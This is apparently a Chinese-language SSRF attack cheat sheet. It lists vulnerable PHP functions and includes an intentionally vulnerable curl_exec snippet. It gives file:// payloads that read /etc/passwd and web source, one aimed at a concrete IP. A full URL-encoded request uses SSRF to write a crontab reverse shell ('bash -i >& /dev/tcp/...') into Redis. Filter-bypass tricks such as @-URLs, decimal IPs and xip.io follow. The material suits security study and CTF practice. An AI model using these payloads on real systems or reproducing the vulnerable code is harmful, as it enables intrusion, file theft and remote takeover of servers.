
# SSRF
”伪造”服务器端发起的请求，从而获取客户端所不能得到的数据。

## 基础知识

**漏洞成因**

三个常见的容易造成ssrf漏洞的函数
```
    fsockopen()
    file_get_contents()
    curl_exec()
```

**漏洞常出现的位置**

- 分享：通过URL地址分享网页内容
- 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。
- 在线翻译：通过URL地址翻译成对应文本的内容。
- 图片加载与下载：通过URL地址加载或下载图片。
- 图片、文章收藏功能。
- 未公开的API实现以及其他调用URL的功能。


**漏洞危害**


- 可以对外网、服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息
- 攻击运行在内网或本地的应用程序
- 对内网Web应用进行指纹识别，通过访问默认文件实现
- 攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（例如Struts2漏洞、SQL注入）
- 利用协议读取本地文件（例如File://、gopher://、dict://等协议）

### 漏洞代码

```
<form action="" method="get">
    please in put the img url:<input type="text" name="url" />
    <input type="submit">
</form>
<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_GET["url"]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
$output = curl_exec($ch);
echo $output;
curl_close($ch);
?>

```

## 测试方法

```
http://13.94.33.143:8089/index.php?url=file://flag.txt

查看源码：
file://../index.php

apache:
file:///var/www/html/index.php

nginx:
file:///usr/share/nginx/html/index.php
```

- 读取目标系统中本地文件：
```
file://etc/passwd
```
- Redis反弹shell

通过传入%0a%0d来注入换行符

```
set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/172.18.0.1/21 0>&1\n\n\n\n" config set dir /etc/ config set dbfilename crontab save
```
注意，换行符是“\r\n”，也就是“%0D%0A”。将url编码后的字符串放在ssrf的域名后面，发送：
```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.18.0.3:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0AaaaHTTP/1.1Host:localhostAccept:*/*Accept-Language:enUser-Agent:Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Win64;x64;Trident/5.0)Connection:close
```

**绕过方法**

```
使用@：http://A.com@10.10.10.10 = 10.10.10.10
IP地址转换成十进制、八进制：127.0.0.1 = 2130706433
使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx
端口绕过：ip后面加一个端口
xip.io：10.0.0.1.xip.io = 10.0.0.1
        www.10.0.0.1.xip.io = 10.0.0.1
        mysite.10.0.0.1.xip.io = 10.0.0.1
        foo.bar.10.0.0.1.xip.io = 10.0.0.1
通过js跳转

示例：
1、http://172.18.0.21@127.0.0.1/flag.php
2、输入http://www.127.0.0.1.xip.io/flag.php可以绕过限制

```

代码审计

[Discuz x3.4前台SSRF](https://xz.aliyun.com/t/3493)